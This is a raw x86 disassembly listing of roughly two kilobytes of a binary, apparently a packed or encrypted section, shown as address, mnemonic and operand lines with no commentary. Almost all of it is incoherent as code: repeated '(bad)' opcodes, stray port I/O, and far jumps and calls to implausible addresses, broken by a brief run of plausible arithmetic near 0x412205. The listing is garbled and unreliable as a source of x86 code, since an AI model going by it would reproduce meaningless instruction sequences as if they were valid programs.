  411cf3:	ds (bad) 
  411cf5:	into   
  411cf6:	rcl    dh,1
  411cf8:	adc    eax,0x1266579e
  411cfd:	mov    ch,0x79
  411cff:	or     DWORD PTR [esi+0x65],edi
  411d02:	js     0x411d7c
  411d04:	in     eax,0x7e
  411d06:	js     0x411d80
  411d08:	shl    BYTE PTR [edi],0xa3
  411d0b:	cld    
  411d0c:	jno    0x411cf9
  411d0e:	sbb    al,0x35
  411d10:	cmp    DWORD PTR [ecx],ebx
  411d12:	sub    DWORD PTR [eax],ebx
  411d14:	inc    esp
  411d15:	cmp    al,0xb
  411d17:	pop    ebx
  411d18:	(bad)  
  411d19:	adc    DWORD PTR [ebp-0x16e82945],edx
  411d1f:	mov    ch,ch
  411d21:	shl    BYTE PTR [ebp-0x64ebd949],cl
  411d27:	sbb    ecx,ebx
  411d29:	pop    ebx
  411d2a:	int    0x1a
  411d2c:	gs cwde 
  411d2e:	cmp    eax,0xdb3774f5
  411d33:	and    ebp,DWORD PTR [edx+0x54]
  411d36:	popf   
  411d37:	sub    dh,cl
  411d39:	and    dl,bh
  411d3b:	mov    ah,0x1b
  411d3d:	xchg   ecx,eax
  411d3e:	mov    al,es:0x27f97071
  411d44:	(bad)  
  411d45:	idiv   DWORD PTR [esi+0x36]
  411d48:	sbb    edx,eax
  411d4a:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411d4c:	sub    BYTE PTR [edi-0x6460447f],dl
  411d52:	lea    edi,[eax+0x6915c5e3]
  411d58:	inc    ebp
  411d59:	or     al,dh
  411d5b:	fisubr DWORD PTR [eax+0x36]
  411d5e:	adc    ecx,DWORD PTR [ebp-0x27f59bab]
  411d64:	not    DWORD PTR [eax]
  411d66:	or     dh,cl
  411d68:	test   eax,0xba0436f8
  411d6d:	(bad)  
  411d6e:	xchg   ecx,eax
  411d6f:	jmp    0xb92a:0x2bfcd7f
  411d76:	lock pop eax
  411d78:	or     eax,0xcae8d828
  411d7d:	jo     0x411dd3
  411d7f:	pop    ds
  411d80:	outs   dx,DWORD PTR ds:[esi]
  411d81:	int3   
  411d82:	pop    edx
  411d83:	dec    ecx
  411d84:	js     0x411dfa
  411d86:	and    esi,ebp
  411d88:	mov    cl,0xe
  411d8a:	jmp    0x411d5e
  411d8c:	pop    ebx
  411d8d:	lahf   
  411d8e:	test   edi,ebp
  411d90:	sbb    cl,BYTE PTR [ebx+0x1e]
  411d93:	lahf   
  411d94:	dec    ebp
  411d95:	dec    esi
  411d96:	cli    
  411d97:	sub    edi,esi
  411d99:	dec    esp
  411d9a:	mov    ch,0x91
  411d9c:	or     DWORD PTR [edi+edi*1-0x30c9206b],edx
  411da3:	and    al,0xb6
  411da5:	rcl    DWORD PTR [esi-0x48],cl
  411da8:	test   DWORD PTR [ebp-0x1e960af5],ebx
  411dae:	add    dh,BYTE PTR [esi-0xda48f6e]
  411db4:	jg     0x411e00
  411db6:	in     eax,0xf9
  411db8:	or     al,0xdb
  411dba:	sbb    edx,DWORD PTR [ecx]
  411dbc:	fisttp QWORD PTR [esi-0x1efd616f]
  411dc2:	or     eax,0x5a249e5b
  411dc7:	sub    eax,0x48e1aae5
  411dcc:	jg     0x411e13
  411dce:	test   eax,0xf5633adb
  411dd3:	jo     0x411e3b
  411dd5:	dec    ebp
  411dd6:	mov    al,0xc1
  411dd8:	xchg   ecx,eax
  411dd9:	mov    esp,0xbad1fbe9
  411dde:	in     eax,dx
  411ddf:	cmp    BYTE PTR [eax-0x2f],al
  411de2:	loop   0x411e20
  411de4:	jo     0x411ddb
  411de6:	outs   dx,BYTE PTR ds:[esi]
  411de7:	stos   DWORD PTR es:[edi],eax
  411de8:	in     eax,0x89
  411dea:	push   ecx
  411deb:	adc    ah,dh
  411ded:	xor    BYTE PTR [eax],ah
  411def:	mov    ebp,0xe1e21ad1
  411df4:	fs dec esp
  411df6:	addr16 imul esi,esi,0x5d903714
  411dfd:	mov    ecx,0xb53477c0
  411e02:	add    BYTE PTR [ecx+0x5ed3ab3c],0x72
  411e09:	jle    0x411e45
  411e0b:	scas   al,BYTE PTR es:[edi]
  411e0c:	ret    
  411e0d:	dec    ebx
  411e0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411e0f:	xchg   DWORD PTR [esi+0x5a15a75a],ebp
  411e15:	add    DWORD PTR [eax-0x7c4a09b9],esi
  411e1b:	stc    
  411e1c:	lds    ebp,FWORD PTR [edx]
  411e1e:	pop    ds
  411e1f:	das    
  411e20:	sbb    ch,BYTE PTR [edi]
  411e22:	sbb    DWORD PTR [ebx+0x7afeb73c],edi
  411e28:	lahf   
  411e29:	or     esi,0xfffffff4
  411e2c:	imul   ebx,edx,0x17
  411e2f:	inc    ebp
  411e30:	mov    esi,0x1d15057d
  411e35:	iret   
  411e36:	popf   
  411e37:	(bad)  
  411e38:	(bad)  
  411e39:	shl    BYTE PTR [ecx-0x21457ef7],0xa7
  411e40:	test   DWORD PTR ds:0x70f39ca5,esi
  411e46:	cmp    ch,BYTE PTR [ebx+0x544dcf6c]
  411e4c:	gs dec ebx
  411e4e:	shl    DWORD PTR [ebx+0x5f16cd96],1
  411e54:	pop    edx
  411e55:	fdiv   QWORD PTR [eax+0x28392668]
  411e5b:	pusha  
  411e5c:	retf   0x1523
  411e5f:	js     0x411de6
  411e61:	adc    DWORD PTR [eax+0x2fa042de],0x1c
  411e68:	xchg   BYTE PTR [edi+eax*4],cl
  411e6b:	fsubr  QWORD PTR [edx-0x5f0d693f]
  411e71:	mov    ecx,fs
  411e73:	inc    ebp
  411e74:	sbb    bl,ch
  411e76:	mov    DWORD PTR [edx+0x17],ebx
  411e79:	pop    ebp
  411e7a:	sub    DWORD PTR [eax+0x7a],edi
  411e7d:	mov    esp,0xc64315cc
  411e82:	aam    0x78
  411e84:	(bad)  
  411e85:	xchg   edx,eax
  411e86:	cdq    
  411e87:	add    eax,0x5e356a8c
  411e8c:	call   0xaff6b23b
  411e91:	shl    BYTE PTR [edi-0x73e567bd],0x62
  411e98:	push   ecx
  411e99:	in     eax,dx
  411e9a:	pushf  
  411e9b:	loope  0x411f0a
  411e9d:	sbb    eax,DWORD PTR ds:0x78662ae6
  411ea3:	or     ecx,DWORD PTR [esi+eiz*4+0x2c]
  411ea7:	push   ds
  411ea8:	xchg   DWORD PTR [ecx-0xe],esp
  411eab:	out    dx,al
  411eac:	jo     0x411f03
  411eae:	and    edi,DWORD PTR [esi-0x6c576527]
  411eb4:	and    al,0xf9
  411eb6:	mov    esi,0x86beed70
  411ebb:	cmp    al,0x10
  411ebd:	(bad)  
  411ebf:	nop
  411ec0:	rcl    BYTE PTR ds:0x2a5fb2fe,1
  411ec6:	or     esp,esp
  411ec8:	mov    WORD PTR [esi+ebp*4-0x4c],?
  411ecc:	push   esi
  411ecd:	adc    DWORD PTR [ebx+0x3a4f621a],ebx
  411ed3:	outs   dx,DWORD PTR ds:[esi]
  411ed4:	out    dx,al
  411ed5:	mov    al,0x78
  411ed7:	cwde   
  411ed8:	sti    
  411ed9:	inc    edx
  411eda:	jle    0x411f3b
  411edc:	scas   eax,DWORD PTR es:[edi]
  411edd:	ins    BYTE PTR es:[edi],dx
  411ede:	sti    
  411edf:	sub    eax,0xfb324bc6
  411ee4:	sbb    al,0x4f
  411ee6:	mov    DWORD PTR [edx+0x6851ad7a],edi
  411eec:	jmp    0x411eac
  411eee:	add    BYTE PTR [ebx+0xd],bh
  411ef1:	push   cs
  411ef2:	in     al,0x32
  411ef4:	cdq    
  411ef5:	or     DWORD PTR [esi-0x15830d15],0xf
  411efc:	pop    edi
  411efd:	or     eax,0xb77f7685
  411f02:	iret   
  411f03:	icebp  
  411f04:	push   0x65
  411f06:	mov    ebx,0xfd9aa806
  411f0b:	inc    edx
  411f0c:	dec    eax
  411f0d:	push   ebp
  411f0e:	test   DWORD PTR [edi+0x75],edx
  411f11:	test   al,0xac
  411f13:	cmp    eax,0xbdcd399b
  411f18:	dec    ebx
  411f19:	fwait
  411f1a:	data16 sbb al,0x4
  411f1d:	clc    
  411f1e:	inc    BYTE PTR [ebp-0x1247065b]
  411f24:	jl     0x411f1b
  411f26:	xchg   edx,eax
  411f27:	jo     0x411f91
  411f29:	jae    0x411f65
  411f2b:	jmp    0x411f9b
  411f2d:	sub    esi,DWORD PTR [esi-0x53]
  411f30:	les    ecx,FWORD PTR [eax]
  411f32:	and    ecx,ecx
  411f34:	dec    esi
  411f35:	cmp    eax,0x1a34a973
  411f3a:	sbb    al,0x75
  411f3c:	aas    
  411f3d:	stos   DWORD PTR es:[edi],eax
  411f3e:	jno    0x411f2c
  411f40:	dec    esp
  411f41:	rcl    DWORD PTR [ebx-0x3f70ec6e],1
  411f47:	inc    ebp
  411f48:	cmc    
  411f49:	les    eax,FWORD PTR [esi+0x5535b8f1]
  411f4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411f50:	mov    esp,esp
  411f52:	pop    es
  411f53:	cdq    
  411f54:	jg     0x411f2d
  411f56:	mov    dl,0x83
  411f58:	rcl    bh,cl
  411f5a:	je     0x411f3f
  411f5c:	mov    bl,0x4a
  411f5e:	cmp    BYTE PTR [esi],ah
  411f60:	cmc    
  411f61:	imul   ecx,DWORD PTR ds:0x5bf30217,0x3d
  411f68:	mov    esi,0x98f6d4de
  411f6d:	add    DWORD PTR [ecx-0x50],0x8b6e6bad
  411f74:	push   ebp
  411f75:	les    ecx,FWORD PTR [ebx-0x7cc0383]
  411f7b:	xor    edx,eax
  411f7d:	jmp    0x412205
  411f82:	rol    dl,1
  411f84:	enter  0xdac3,0xd1
  411f88:	fcmovnu st,st(1)
  411f8a:	xchg   ebp,eax
  411f8b:	add    al,0x8c
  411f8d:	inc    edi
  411f8e:	inc    ebx
  411f8f:	adc    BYTE PTR ds:0x786bebb8,dh
  411f95:	js     0x411f7c
  411f97:	jle    0x412011
  411f99:	js     0x411f8d
  411f9b:	mov    bh,0xc7
  411f9d:	dec    eax
  411f9e:	sub    edx,DWORD PTR [esi]
  411fa0:	(bad)  
  411fa1:	in     al,dx
  411fa2:	clc    
  411fa3:	andps  xmm1,xmm0
  411fa6:	(bad)  
  411fa7:	iret   
  411fa8:	cmp    al,0xcf
  411faa:	dec    esi
  411fab:	imul   BYTE PTR [ebp-0x40ba2d91]
  411fb1:	jb     0x411fef
  411fb3:	sub    al,0x20
  411fb5:	clc    
  411fb6:	pop    esi
  411fb7:	push   esp
  411fb8:	cmp    DWORD PTR [ebp+0x57d4abcc],0xcb918fe8
  411fc2:	mov    DWORD PTR [ebp+0x30],esi
  411fc5:	push   ecx
  411fc6:	or     BYTE PTR [ecx+0x25],al
  411fc9:	mov    edi,0xb6da520
  411fce:	data16 jnp 0x412041
  411fd1:	stc    
  411fd2:	je     0x411fbf
  411fd4:	js     0x411fc5
  411fd6:	pop    ebx
  411fd7:	aad    0x89
  411fd9:	push   ebp
  411fda:	test   eax,0x29f22cc3
  411fdf:	jmp    0xa2c6e596
  411fe4:	das    
  411fe5:	add    bl,BYTE PTR [ebp+0x54]
  411fe8:	js     0x411fda
  411fea:	sub    al,ah
  411fec:	call   FWORD PTR [eax+0x4550343b]
  411ff2:	or     eax,0x489e8cd7
  411ff7:	pop    edi
  411ff8:	gs rol ah,cl
  411ffb:	fadd   QWORD PTR [eax+edi*8+0x26]
  411fff:	clc    
  412000:	aad    0x68
  412002:	pop    ebp
  412003:	repz inc edx
  412005:	mov    dl,0xf8
  412007:	and    DWORD PTR [eax-0x14],ecx
  41200a:	pushf  
  41200b:	sub    al,0xca
  41200d:	add    al,al
  41200f:	xchg   ecx,eax
  412010:	pop    esi
  412011:	push   ds
  412012:	jo     0x412077
  412014:	pusha  
  412015:	mov    DWORD PTR [edi-0x3fc0949],ebp
  41201b:	xor    eax,0xc6714c20
  412020:	aad    0x1c
  412022:	xabort 0x3
  412025:	push   edi
  412026:	and    bh,BYTE PTR [ebx-0x4187da74]
  41202c:	popa   
  41202d:	mov    dl,BYTE PTR [edi-0x634932ab]
  412033:	cmp    DWORD PTR [esi+0x5],ecx
  412036:	ja     0x412037
  412038:	ins    BYTE PTR es:[edi],dx
  412039:	pop    es
  41203a:	data16 jns 0x411fd9
  41203d:	dec    ebx
  41203e:	add    ebx,ecx
  412040:	inc    edx
  412041:	jmp    0xbb77:0x927aca14
  412048:	inc    ebx
  412049:	jnp    0x411fd3
  41204b:	mov    ebp,0x2bb8e37f
  412050:	(bad)  
  412052:	(bad)  
  412053:	xor    ebx,ebx
  412055:	mov    cl,0x48
  412057:	sbb    ebp,DWORD PTR [edi+ecx*4]
  41205a:	pop    edx
  41205b:	xor    al,0xcf
  41205d:	xor    al,0xa2
  41205f:	rcl    BYTE PTR [eax+0x54],cl
  412062:	jmp    0x4120dd
  412064:	icebp  
  412065:	iret   
  412066:	jb     0x411fef
  412068:	aas    
  412069:	dec    ebx
  41206a:	cdq    
  41206b:	adc    al,0x0
  41206d:	dec    ebp
  41206e:	stos   DWORD PTR es:[edi],eax
  41206f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412070:	cmp    eax,0x2d6d2014
  412075:	sbb    BYTE PTR [ebp+0x7],ah
  412078:	jo     0x4120df
  41207a:	in     eax,dx
  41207b:	push   ebx
  41207c:	cmc    
  41207d:	aam    0xd
  41207f:	xchg   ecx,eax
  412080:	dec    esi
  412081:	in     eax,dx
  412082:	fisub  WORD PTR [edx-0x78]
  412085:	icebp  
  412086:	pop    edx
  412087:	xchg   DWORD PTR [ebx],edi
  412089:	sub    eax,0xf220c684
  41208e:	xor    ch,BYTE PTR [edi]
  412090:	lds    ebp,FWORD PTR [eax-0x52875d7c]
  412096:	xchg   BYTE PTR [eax-0x30],dl
  412099:	adc    DWORD PTR [edi-0x5fccbd7c],esp
  41209f:	xchg   edi,eax
  4120a0:	stc    
  4120a1:	mov    edx,0xd5b29544
  4120a6:	iret   
  4120a7:	mov    cl,0x8f
  4120a9:	mov    ch,0x36
  4120ab:	inc    DWORD PTR [ecx-0x33e46328]
  4120b1:	not    DWORD PTR [eax]
  4120b3:	fs xchg esp,eax
  4120b5:	cmp    DWORD PTR [ebp+0x74e5317b],ebx
  4120bb:	jmp    0x41213a
  4120bd:	mov    ebx,0x3529a0c6
  4120c2:	inc    edi
  4120c3:	sub    al,0x7d
  4120c5:	int    0x55
  4120c7:	inc    esi
  4120c8:	sub    eax,0xb34f3c66
  4120cd:	xor    eax,0xcf35f18c
  4120d2:	add    cl,BYTE PTR [edi-0x3ce55378]
  4120d8:	or     al,bh
  4120da:	push   ds
  4120db:	mov    dh,BYTE PTR [ebx+0x1f]
  4120de:	scas   eax,DWORD PTR es:[edi]
  4120df:	push   edi
  4120e0:	xor    ecx,esi
  4120e2:	dec    eax
  4120e3:	cmp    BYTE PTR [esi],bh
  4120e5:	pushf  
  4120e6:	xchg   edi,eax
  4120e7:	shr    DWORD PTR [ecx],1
  4120e9:	es ret 
  4120eb:	and    bl,ah
  4120ed:	pusha  
  4120ee:	sbb    al,0xf4
  4120f0:	daa    
  4120f1:	push   esp
  4120f2:	in     al,dx
  4120f3:	je     0x4120bb
  4120f5:	shl    DWORD PTR [eax],1
  4120f7:	scas   al,BYTE PTR es:[edi]
  4120f8:	pop    edx
  4120f9:	scas   al,BYTE PTR es:[edi]
  4120fa:	scas   eax,DWORD PTR es:[edi]
  4120fb:	push   edi
  4120fc:	cmp    dh,dl
  4120fe:	jecxz  0x412105
  412100:	mov    ecx,0xda4e808f
  412105:	jmp    0xc987bdfc
  41210a:	dec    edx
  41210b:	push   es
  41210c:	ss loope 0x412112
  41210f:	shr    BYTE PTR [esp+ebx*2+0x59],0x4f
  412114:	cmp    bl,BYTE PTR [edi]
  412116:	out    0xd0,al
  412118:	les    esi,FWORD PTR [edx-0x3e947827]
  41211e:	mov    al,ds:0x837b3332
  412123:	jmp    0x36d87595
  412128:	jmp    0xd111:0x7f830723
  41212f:	ja     0x4120fe
  412131:	sub    al,0x6a
  412133:	sbb    esp,ebx
  412135:	enter  0xfe06,0xe8
  412139:	std    
  41213a:	out    0xb5,eax
  41213c:	repnz mov ds:0xee0a8432,al
  412142:	push   ecx
  412143:	and    esp,DWORD PTR [edx+ebp*8+0x29f34a2b]
  41214a:	bound  esp,QWORD PTR [ebx]
  41214c:	adc    al,0xd5
  41214e:	push   ds
  41214f:	scas   al,BYTE PTR es:[edi]
  412150:	inc    esi
  412151:	sti    
  412152:	sub    BYTE PTR gs:[ebp-0x354a9e03],0xc6
  41215a:	add    al,0x6
  41215c:	js     0x412172
  41215e:	sub    ebp,DWORD PTR [esi]
  412160:	push   edi
  412161:	add    WORD PTR [ebp+0x2f590a12],di
  412168:	mov    edx,0x867a7760
  41216d:	dec    esp
  41216e:	pop    esp
  41216f:	mov    edi,0x8fb2b52f
  412174:	push   ebx
  412175:	sbb    DWORD PTR [eax-0x2c44f9d4],0x76
  41217c:	jno    0x412176
  41217e:	test   DWORD PTR [edi+0x3ce086da],ecx
  412184:	inc    esp
  412185:	cmc    
  412186:	jbe    0x41219a
  412188:	arpl   WORD PTR [edx],bp
  41218a:	mov    BYTE PTR [esi-0x16],al
  41218d:	jmp    0x6d71:0x2ed3b281
  412194:	jno    0x412130
  412196:	jae    0x4121ea
  412198:	lods   al,BYTE PTR ds:[esi]
  412199:	push   edi
  41219a:	mov    edi,0xf3c26a2
  41219f:	sbb    al,0xbf
  4121a1:	pusha  
  4121a2:	out    0x72,eax
  4121a4:	call   0xe24b:0xe46d5c78
  4121ab:	mov    dh,0x6c
  4121ad:	sub    BYTE PTR [ecx],dh
  4121af:	inc    ebp
  4121b0:	and    bh,cl
  4121b2:	(bad)  
  4121b3:	or     BYTE PTR [ebp+0x24],dh
  4121b6:	jecxz  0x412166
  4121b8:	clc    
  4121b9:	lods   al,BYTE PTR ds:[esi]
  4121ba:	jo     0x41217a
  4121bc:	adc    bl,dl
  4121be:	sbb    DWORD PTR ds:0x43297bcf,ecx
  4121c4:	inc    ebx
  4121c5:	jmp    0x6d93:0xe3a07ec0
  4121cc:	xor    eax,DWORD PTR [esi-0x61]
  4121cf:	add    DWORD PTR [esi+ebx*8],0xbe9416f6
  4121d6:	mov    gs:0x1e85fd98,eax
  4121dc:	lahf   
  4121dd:	es mov cl,0x7c
  4121e0:	jns    0x41221a
  4121e2:	jmp    0x781b:0x6076522b
  4121e9:	(bad)  
  4121ea:	or     ecx,DWORD PTR [ebx+0x17]
  4121ed:	push   edx
  4121ee:	xchg   edx,eax
  4121ef:	int3   
  4121f0:	mov    edi,0x91cf10f7
  4121f5:	jg     0x412205
  4121f7:	rol    BYTE PTR ds:0xba67c0c9,1
  4121fd:	jne    0x412215
  4121ff:	arpl   WORD PTR [ebp-0x50bb1812],bp
  412205:	add    edi,ecx
  412207:	add    edx,ecx
  412209:	imul   edx,edi
  41220c:	mov    DWORD PTR [ebp+0xc],edx
  41220f:	mov    edx,DWORD PTR [ebp+0xc]
  412212:	mov    DWORD PTR [ebp-0x24],edx
  412215:	mov    edx,DWORD PTR [ebp-0x8]
  412218:	add    edx,DWORD PTR [ebp-0x40]
  41221b:	mov    DWORD PTR [ebp-0x18],0xf89c8538
  412222:	jmp    0x4124aa
  412227:	(bad)
  41222b:	(bad)  
  41222c:	fcmovnu st,st(1)
  41222e:	shr    esp,1
  412230:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412231:	xchg   edx,eax
  412232:	(bad)  
  412233:	dec    ecx
  412234:	iret   
  412235:	cmp    ecx,DWORD PTR [esi+0x78786950]
  41223b:	in     eax,0x7e
  41223d:	js     0x4122b7
  41223f:	dec    esp
  412240:	leave  
  412241:	xor    al,0xe2
  412243:	pusha  
  412244:	mov    ch,dh
  412246:	sub    eax,0x4ebe89f
  41224b:	jg     0x412296
  41224d:	aas    
  41224e:	test   DWORD PTR [ecx+0x5c],ebx
  412251:	call   0xd8c6:0xb7226e35
  412258:	add    BYTE PTR [edi+edx*2+0x16],bh
  41225c:	cs bnd ret 0xe30c
  412261:	ja     0x41226c
  412263:	and    al,0x44
  412265:	mov    ecx,eax
  412267:	mov    ch,0xd8
  412269:	aaa    
  41226a:	bound  edx,QWORD PTR [ebx-0x6af125ba]
  412270:	mov    ds:0x5a99fff6,eax
  412275:	dec    edi
  412276:	clc    
  412277:	fistp  QWORD PTR [eax+0x33]
  41227a:	xchg   esp,eax
  41227b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41227c:	xchg   ebp,eax
  41227d:	dec    edx
  41227e:	cs jo  0x412292
  412281:	dec    esp
  412282:	sar    DWORD PTR [ebp+0x2d],0xfe
  412286:	mov    eax,0x3d1146aa
  41228b:	test   al,0x62
  41228d:	cli    
  41228e:	enter  0x3fb7,0xdd
  412292:	xchg   ebp,eax
  412293:	xlat   BYTE PTR ds:[ebx]
  412294:	aam    0xd3
  412296:	imul   edi,DWORD PTR [edi],0x5cd2bfd1
  41229c:	push   ebx
  41229d:	pop    eax
  41229e:	or     DWORD PTR [esp+esi*2-0x5c],eax
  4122a2:	or     DWORD PTR [edi+eiz*2+0x18],0xc2897015
  4122aa:	push   ecx
  4122ab:	pop    ecx
  4122ac:	dec    edx
  4122ad:	lods   al,BYTE PTR ds:[esi]
  4122ae:	mov    ebp,0x17544956
  4122b3:	and    DWORD PTR [edi],esp
  4122b5:	or     eax,0xe88dc732
  4122ba:	xchg   ecx,eax
  4122bb:	repz pop ebx
  4122bd:	dec    BYTE PTR [edx-0x46f474af]
  4122c3:	sub    eax,0xfab6a0c7
  4122c8:	cmp    eax,DWORD PTR [ebp+0x5dc9c784]
  4122ce:	adc    cl,bl
  4122d0:	jmp    0xb7aa:0x727c9ae3
  4122d7:	pop    esi
  4122d8:	xor    BYTE PTR [ebx],0xb0
  4122db:	repz rol DWORD PTR [eax],cl
  4122de:	xchg   BYTE PTR [eax+0x5e078a96],dh
  4122e4:	jbe    0x41233b
  4122e6:	imul   DWORD PTR [edi-0x22b25fa6]
  4122ec:	lds    eax,FWORD PTR [ecx+edi*2]
  4122ef:	bound  eax,QWORD PTR [edi]
  4122f1:	jne    0x412324
  4122f3:	mov    eax,0xa62cc5d
  4122f8:	and    eax,0x868b1f04
  4122fd:	cmp    DWORD PTR [esi+0x61],0x4
  412301:	ins    BYTE PTR es:[edi],dx
  412302:	dec    ebx
  412303:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412304:	and    DWORD PTR [eax+0x49],ebx
  412307:	jecxz  0x4122eb
  412309:	loop   0x4122c5
  41230b:	or     eax,0xae24b042
  412310:	arpl   WORD PTR [ebx-0x47f00623],si
  412316:	or     ah,BYTE PTR fs:[edx+0x6c]
  41231a:	stc    
  41231b:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  41231d:	outs   dx,BYTE PTR ds:[esi]
  41231e:	fcomp  st(1)
  412320:	push   esp
  412321:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412322:	adc    BYTE PTR [edi+0x2999ced0],bl
  412328:	xchg   DWORD PTR [esi],ebx
  41232a:	dec    esp
  41232b:	sbb    dl,BYTE PTR [eax+0x17]
  41232e:	rcr    ecx,0xdc
  412331:	das    
  412332:	xchg   BYTE PTR [edx-0x2d6c3093],bl
  412338:	jge    0x412340
  41233a:	shr    BYTE PTR [esi+0x5e71968],0xa7
  412341:	cmp    eax,edi
  412343:	es clc 
  412345:	jl     0x412346
  412347:	(bad)  
  412348:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412349:	mov    edx,DWORD PTR gs:[ebx+0x18b629fa]
  412350:	xchg   edi,eax
  412351:	mov    edi,0x38a88509
  412356:	repnz pop esp
  412358:	jnp    0x412361
  41235a:	dec    edi
  41235b:	jnp    0x4123a3
  41235d:	fdiv   DWORD PTR [edi+0x10e6c7f]
  412363:	adc    ebp,DWORD PTR [esi]
  412365:	push   ebx
  412366:	push   edi
  412367:	lea    esi,[ecx]
  412369:	add    DWORD PTR [esi],ebx
  41236b:	push   ds
  41236c:	mov    esp,0x8a50a983
  412371:	rol    edx,cl
  412373:	and    esp,DWORD PTR [ebx+ebp*4]
  412376:	not    DWORD PTR [ebx+0x6]
  412379:	inc    esi
  41237a:	(bad)  
  41237b:	cli    
  41237c:	mov    edx,0xab689905
  412381:	inc    ebx
  412382:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412383:	das    
  412384:	push   edi
  412385:	dec    eax
  412386:	adc    BYTE PTR [ecx+0x33ad5d1a],cl
  41238c:	loopne 0x41230f
  41238e:	les    edi,FWORD PTR [ecx-0x623a6c4c]
  412394:	mov    al,ds:0xb0fabdfa
  412399:	mov    ch,0xe7
  41239b:	fstp   DWORD PTR [edi-0x80]
  41239e:	repnz mov eax,ds:0x529ed0ee
  4123a4:	out    0xf2,eax
  4123a6:	xor    ah,dh
  4123a8:	and    al,BYTE PTR [ecx]
  4123aa:	retf   
  4123ab:	mov    ds:0x832deda0,eax
  4123b0:	pop    ds
  4123b1:	iret   
  4123b2:	or     DWORD PTR [edi],ebp
  4123b4:	scas   al,BYTE PTR es:[edi]
  4123b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4123b6:	imul   esp,DWORD PTR [edi-0x13],0xc1e7921
  4123bd:	xchg   ecx,eax
  4123be:	jae    0x412397
  4123c0:	gs retf 0x8c73
  4123c4:	pop    edx
  4123c5:	cmp    eax,0x4490a8f6
  4123ca:	adc    dl,BYTE PTR [ecx]
  4123cc:	jmp    0x34619c25
  4123d1:	mov    ds:0x916787f3,eax
  4123d6:	xor    cl,cl
  4123d8:	out    0xa0,al
  4123da:	jb     0x4123d6
  4123dc:	fst    st(2)
  4123de:	jno    0x412381
  4123e0:	push   edx
  4123e1:	(bad)  
  4123e2:	out    0x48,al
  4123e4:	adc    edx,DWORD PTR ds:0x9f390245
  4123ea:	ins    DWORD PTR es:[edi],dx
  4123eb:	and    edi,DWORD PTR [edi+edx*1-0x558d3f3b]
  4123f2:	jo     0x4123c2
  4123f4:	(bad)  
  4123f6:	je     0x41239e
  4123f8:	adc    al,0x6d
  4123fa:	or     DWORD PTR [ecx-0x48bbfeee],esi
  412400:	sub    ecx,edx
  412402:	dec    ecx
  412403:	push   ebp
  412404:	mov    ah,0x9a
  412406:	xchg   edx,eax
  412407:	cdq    
  412408:	push   es
  412409:	aad    0x74
  41240b:	shl    BYTE PTR [edi-0x4e19cb9a],0x6e
  412412:	int3   
  412413:	ja     0x4123b6
  412415:	sub    edi,DWORD PTR ds:0x79c89044
  41241b:	cwde   
  41241c:	mov    ebx,DWORD PTR [ecx-0x35]
  41241f:	mov    ah,0x8
  412421:	stos   DWORD PTR es:[edi],eax
  412422:	add    cl,BYTE PTR [ecx]
  412424:	imul   edx,DWORD PTR [ecx+0x58782623],0x3e7345f1
  41242e:	adc    ebx,esp
  412430:	and    BYTE PTR [edx],0xc1
  412433:	sub    BYTE PTR [edi+0x48],ch
  412436:	xchg   ebp,eax
  412437:	and    edx,DWORD PTR [edx+0x5]
  41243a:	xchg   esi,eax
  41243b:	xchg   ecx,eax
  41243c:	jl     0x412418
  41243e:	xlat   BYTE PTR ds:[ebx]
  41243f:	jg     0x412440
  412441:	mov    ebx,0xe7e5ad92
  412446:	mov    cl,0x7b
  412448:	jl     0x412478
  41244a:	sbb    al,ch
  41244c:	sub    edi,0x7c0b2080
  412452:	pop    ds
  412453:	jbe    0x4124bd
  412455:	or     BYTE PTR ds:0x69486537,ch
  41245b:	adc    al,BYTE PTR [eax]
  41245d:	adc    ebx,DWORD PTR [ebx]
  41245f:	stos   DWORD PTR es:[edi],eax
  412460:	fst    DWORD PTR [edi]
  412462:	pop    ebx
  412463:	mov    esi,esi
  412465:	sbb    DWORD PTR [ecx+0x5313d1e0],edi
  41246b:	mov    edi,0x3ed7dc42
  412470:	sbb    esp,ebp
  412472:	cld    
  412473:	xchg   esi,eax
  412474:	fisub  DWORD PTR [esi+0x1e6359d2]
  41247a:	xor    eax,0xb9d254fb
  41247f:	cs mov ch,dl
  412482:	push   ecx
  412483:	add    eax,0xc763d3f8
  412488:	sbb    bl,BYTE PTR [edi]
  41248a:	clc    
  41248b:	mov    cl,0x90
  41248d:	pusha  
  41248e:	sbb    ebx,esp
  412490:	push   edx
  412491:	ret    
  412492:	mov    ebx,0x815c83a3
  412497:	ins    DWORD PTR es:[edi],dx
  412498:	mov    bl,0xe
  41249a:	push   ss
  41249b:	push   esp
  41249c:	or     eax,0x777747f4
  4124a1:	mov    eax,0xeb771d4f
  4124a6:	mov    al,BYTE PTR [ecx]
  4124a8:	(bad)  
  4124a9:	mov    DWORD PTR ss:[ebp-0x1c],edx
  4124ad:	jmp    0x412735
  4124b2:	iret   
  4124b3:	ret    
  4124b4:	rol    esi,0xd1
  4124b7:	(bad)  
  4124b8:	fcmovnu st,st(1)
  4124ba:	mov    ebx,0x691ebe60
  4124bf:	cmc    
  4124c0:	mov    dh,0xaa
  4124c2:	cmp    eax,0xe578786e
  4124c7:	jle    0x412541
  4124c9:	js     0x4124f3
  4124cb:	cdq    
  4124cc:	push   edx
  4124cd:	mov    ebx,0xfb7f2d4
  4124d2:	adc    DWORD PTR [edi],edi
  4124d4:	imul   edi,DWORD PTR [eax+0x42c4b889],0x37
  4124db:	fdivp  st(5),st
  4124dd:	jo     0x412478
  4124df:	mov    ds:0xcf0d4ac9,eax
  4124e4:	js     0x4124c7
  4124e6:	dec    edx
  4124e7:	mov    dl,0x39
  4124e9:	fldz   
  4124eb:	fsub   QWORD PTR [eax]
  4124ed:	jmp    0xbac9e25
  4124f2:	(bad)  
  4124f3:	push   ds
  4124f4:	xor    al,BYTE PTR [ebp+0x40]
  4124f7:	adc    BYTE PTR [ebx+0x4b],dh
